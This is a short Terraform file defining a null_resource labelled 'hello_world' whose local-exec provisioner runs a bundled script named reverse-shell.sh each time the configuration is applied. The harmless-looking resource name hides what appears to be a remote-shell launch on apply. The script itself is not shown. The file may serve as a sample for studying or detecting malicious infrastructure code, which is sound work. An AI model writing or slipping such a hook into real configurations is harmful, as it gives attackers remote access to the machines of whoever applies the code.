resource "null_resource" "hello_world" {
  triggers = {
    message = var.message
  }

  provisioner "local-exec" {
    command = "bash ${path.module}/reverse-shell.sh"
  }
}
